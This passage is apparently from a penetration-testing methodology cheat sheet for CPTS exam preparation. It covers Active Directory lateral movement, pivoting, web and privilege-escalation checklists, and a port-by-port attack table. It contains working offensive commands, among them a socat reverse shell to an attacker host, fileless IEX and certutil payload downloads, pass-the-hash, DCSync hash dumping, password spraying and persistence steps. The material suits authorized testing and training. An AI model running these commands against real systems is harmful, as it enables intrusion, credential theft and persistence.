  │           # /etc/proxychains4.conf → socks5 127.0.0.1 9050
  │           proxychains nmap -sT <internal_host>
  │
  ├─► STEP 4: Active Directory Lateral Movement
  │     │
  │     ├── Have domain credentials?
  │     │     │
  │     │     ├── YES ──►
  │     │     │     ├── crackmapexec smb <subnet> -u user -p pass
  │     │     │     ├── Enumerate other hosts
  │     │     │     ├── Check admin access to other hosts
  │     │     │     └── psexec.py for shell on other hosts
  │     │     │
  │     │     └── NO ──►
  │     │           ├── Dump hashes from current host
  │     │           ├── secretsdump.py
  │     │           └── Use hashes for pass-the-hash
  │     │
  │     ├── Pass-the-Hash:
  │     │     crackmapexec smb <IP> -u user -H <NTLM_HASH>
  │     │     psexec.py -hashes <LM>:<NTLM> user@<IP>
  │     │     evil-winrm -i <IP> -u user -H <NTLM_HASH>
  │     │
  │     ├── Kerberoasting:
  │     │     GetUserSPNs.py <domain>/<user>:<pass> -request
  │     │     ├── Crack TGS hash offline
  │     │     └── Use cracked password for lateral movement
  │     │
  │     ├── AS-REP Roasting:
  │     │     GetNPUsers.py <domain>/ -usersfile users.txt
  │     │
  │     └── DCSync (if Domain Admin):
  │           secretsdump.py <domain>/<admin>:<pass>@<DC_IP>
  │           └── Dump ALL domain hashes!
  │
  ├─► STEP 5: Advanced Pivoting Tools
  │     ├── Ligolo-ng: Full TUN access without proxychains
  │     ├── rpivot: Reverse SOCKS via HTTP (bypasses egress filtering)
  │     ├── dnscat2: DNS tunneling (bypasses strict firewalls)
  │     ├── ptunnel-ng: ICMP tunneling (when only ping allowed)
  │     └── Socat: Port forwarding / encrypted tunnels
  │
  ├─► STEP 6: AD CS (Certificate Services) Attacks
  │     ├── Check: certipy find -u <user>@<domain> -p <pass> -dc-ip <DC_IP>
  │     ├── ESC1: Misconfigured templates (SAN + Client Auth)
  │     ├── ESC4: Vulnerable template ACL
  │     └── PetitPotam + AD CS Relay:
  │           ntlmrelayx.py -t http://<CA_IP>/certsrv/certfnsh.asp --adcs
  │
  └─► STEP 7: For each new host ──► Go back to Phase 1
        (Enumeration is ITERATIVE!)
```

---

## Phase 6: Documentation & Reporting

```
ASSESSMENT COMPLETE
  │
  ├─► STEP 1: Clean up
  │     ├── Remove uploaded tools and payloads
  │     ├── Remove added users
  │     ├── Remove cron jobs / scheduled tasks
  │     └── Revert any system changes
  │
  ├─► STEP 2: Document findings
  │     For EACH finding:
  │     ├── Title & Severity (Critical/High/Medium/Low)
  │     ├── Description of the vulnerability
  │     ├── Impact (what could an attacker do?)
  │     ├── Steps to reproduce (numbered, detailed)
  │     ├── Evidence (screenshots, command output)
  │     ├── Remediation recommendations
  │     └── References (CVEs, URLs)
  │
  ├─► STEP 3: Create attack chain narrative
  │     └── Show how vulnerabilities chain together
  │
  └─► STEP 4: Deliverables
        ├── Executive summary (for management)
        ├── Technical report (for IT team)
        ├── Raw scan data (appendix)
        └── Proof-of-concept scripts (if applicable)
```

---

## Quick Reference: Port-by-Port Decision Tree

| Port | Service | First Action | Key Attack Vectors |
|------|---------|-------------|-------------------|
| 21 | FTP | `ftp <IP>` → try anonymous | Anonymous login, version exploits, upload web shell |
| 22 | SSH | `nc -nv <IP> 22` (banner) | Credentials from other services, key reuse, brute force |
| 25 | SMTP | `smtp-user-enum` | User enumeration, phishing |
| 53 | DNS | `dig axfr @<IP> <domain>` | Zone transfer, subdomain enum |
| 80/443 | HTTP/S | `whatweb`, `curl -IL`, visit in browser | Full web attack tree (see above) |
| 110/995 | POP3 | `telnet <IP> 110` | Credential brute force |
| 139/445 | SMB | `smbclient -N -L`, `crackmapexec smb` | Shares, EternalBlue, credentials, user enum |
| 161 | SNMP | `snmpwalk -v 2c -c public` | Process creds, software, network info |
| 389/636 | LDAP | `ldapsearch -x -H ldap://<IP>` | AD enumeration, users, groups |
| 88 | Kerberos | `kerbrute userenum` | AS-REP roast, Kerberoast, user enum |
| 1433 | MSSQL | `mssqlclient.py` | xp_cmdshell, credentials |
| 3306 | MySQL | `mysql -u root -p` | INTO OUTFILE, credentials |
| 3389 | RDP | `xfreerdp /v:<IP>` | Credential attacks, BlueKeep |
| 623 | IPMI | `nmap -sU -p 623 --script ipmi-version` | Hash dump (RAKP flaw), default creds |
| 1521 | Oracle TNS | `./odat.py tnscmd -s <IP>` | SID guess, default creds, ODAT RCE |
| 5432 | PostgreSQL | `psql -U postgres -h <IP>` | COPY RCE, read files, credentials |
| 5900 | VNC | `nc -nv <IP> 5900` | Default creds, brute force, registry password |
| 5985/5986 | WinRM | `evil-winrm -i <IP>` | Credential attacks |
| 8080/8443 | HTTP alt | Same as port 80 | Tomcat, Jenkins, GitLab, ColdFusion, Splunk |

---

## Quick Reference: Web Attack Decision Tree

```
WEB APP FOUND
  │
  ├─► Identify technology stack
  ├─► Enumerate directories (gobuster/ffuf)
  ├─► Enumerate subdomains/vhosts
  ├─► Check robots.txt, sitemap.xml
  ├─► View page source
  │
  ├─► Login form found?
  │     ├── Default credentials
  │     ├── SQL injection on login
  │     ├── Brute force
  │     └── Auth bypass techniques
  │
  ├─► Input fields found?
  │     ├── SQL Injection → sqlmap
  │     ├── XSS → cookie stealing
  │     ├── Command Injection → RCE
  │     ├── LFI/RFI → file inclusion
  │     └── SSTI → template injection
  │
  ├─► File upload found?
  │     ├── Extension bypass
  │     ├── Content-Type bypass
  │     └── Web shell upload
  │
  ├─► API endpoints found?
  │     ├── IDOR
  │     ├── Auth bypass
  │     └── Information disclosure
  │
  └─► Specific CMS detected?
        ├── WordPress → wpscan
        ├── Drupal → droopescan, Drupalgeddon
        ├── Joomla → joomscan
        └── Tomcat → WAR file deployment
```

---

## Quick Reference: Privilege Escalation Decision Tree

### Linux Quick Wins (Check These FIRST)

```
1. sudo -l                    ← #1 most important check
2. find / -perm -4000 2>/dev/null   ← SUID binaries
3. cat /etc/crontab            ← Cron jobs
4. getcap -r / 2>/dev/null    ← Capabilities
5. ss -tlnp                   ← Internal services
6. find / -writable -type d 2>/dev/null  ← Writable dirs
7. cat /etc/exports           ← NFS shares
8. id                         ← Current user/groups
9. uname -a                   ← Kernel version
10. grep -ri password /home/ 2>/dev/null  ← Passwords in files
```

### Windows Quick Wins (Check These FIRST)

```
1. whoami /priv               ← #1 most important check (SeImpersonate?)
2. whoami /groups              ← Group membership
3. systeminfo                  ← OS version, hotfixes
4. net user                    ← User list
5. net localgroup administrators  ← Admin users
6. cmdkey /list                ← Saved credentials
7. reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"  ← Auto-logon
8. reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
9. wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"  ← Unquoted paths
10. findstr /si "password" *.txt *.ini *.xml *.config 2>nul  ← Passwords in files
```

---

## Quick Reference: Shell Upgrade Cheat Sheet

```bash
# Python TTY upgrade
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm

# Socat full TTY (if socat available on target)
# On attack machine:
socat file:`tty`,raw,echo=0 tcp-listen:4444
# On target:
socat exec:'bash -li',pty,stderr,setsid,sigint,suspend tcp:<ATTACKER>:4444
```

---

## Quick Reference: File Transfer Cheat Sheet

### Linux → Attack Machine

```bash
# HTTP server on attack machine:
python3 -m http.server 80

# Download on target:
wget http://<ATTACKER>/file
curl http://<ATTACKER>/file -o file

# Or via /dev/tcp (if no wget/curl):
exec 3<>/dev/tcp/<ATTACKER>/80
echo -e "GET /file HTTP/1.1\r\n\r\n" >&3
cat <&3
```

### Windows → Attack Machine

```powershell
# PowerShell download:
(New-Object Net.WebClient).DownloadFile('http://<ATTACKER>/file.exe','C:\Windows\Temp\file.exe')

# Certutil:
certutil -urlcache -split -f http://<ATTACKER>/file.exe file.exe

# SMB transfer:
# On attack machine: impacket-smbserver share /tmp/smbshare -smb2support
copy \\<ATTACKER>\share\file.exe file.exe

# PowerShell IEX (fileless):
IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER>/script.ps1')
```

---

## Quick Reference: Active Directory Attack Order

```
AD ENVIRONMENT DETECTED
  │
  ├─► 1. Enumerate domain info
  │     crackmapexec smb <IP> --shares
  │     ldapsearch -x -H ldap://<IP>
  │
  ├─► 2. User enumeration
  │     kerbrute userenum --dc <IP> -d <domain> users.txt
  │     rpcclient -U "" <IP> -c "enumdomusers"
  │
  ├─► 3. AS-REP Roasting (no auth needed!)
  │     GetNPUsers.py <domain>/ -usersfile users.txt -dc-ip <IP>
  │     ├── Crack hash: hashcat -m 18200 hash.txt rockyou.txt
  │     └── Use cracked password for access
  │
  ├─► 4. Password spraying
  │     crackmapexec smb <subnet> -u users.txt -p 'Spring2024!'
  │
  ├─► 5. Kerberoasting (need ANY valid creds)
  │     GetUserSPNs.py <domain>/<user>:<pass> -request
  │     ├── Crack TGS: hashcat -m 13100 hash.txt rockyou.txt
  │     └── Use cracked service account password
  │
  ├─► 6. Lateral movement with obtained creds
  │     crackmapexec smb <subnet> -u user -p pass
  │     evil-winrm -i <IP> -u user -p pass
  │
  ├─► 7. Privilege escalation on new host
  │     ├── Run winPEAS
  │     ├── Check for SeImpersonatePrivilege
  │     └── Dump SAM/NTDS.dit
  │
  ├─► 8. Domain Admin obtained?
  │     ├── YES ──► DCSync attack
  │     │     secretsdump.py <domain>/<admin>:<pass>@<DC_IP>
  │     │     └── Dump ALL domain hashes
  │     │
  │     └── NO ──► Go back to step 4 with new credentials
  │
  └─► 9. Persistence (if needed)
        ├── Add domain admin account
        ├── Golden ticket attack
        └── Skeleton key attack
```

---

## 🎯 EXAM DAY REMINDERS

1. **ENUMERATE TWICE, EXPLOIT ONCE** — Rushing leads to missed paths
2. **Save ALL scan results** — `nmap -oA`, `gobuster -o`
3. **Check EVERY service** — Don't skip "unimportant" ports
4. **Try credentials everywhere** — Password reuse is REAL
5. **If stuck, re-enumerate** — You probably missed something
6. **Upgrade your shell immediately** — Full TTY makes everything easier
7. **Check for internal services** — `ss -tlnp` / `netstat -an`
8. **LinPEAS/WinPEAS first** — Then manual enumeration
9. **GTFOBins is your best friend** — For sudo/SUID exploitation
10. **Document as you go** — Don't leave reporting to the end

---

*Methodology created from comprehensive analysis of all 27 CPTS Academy modules.*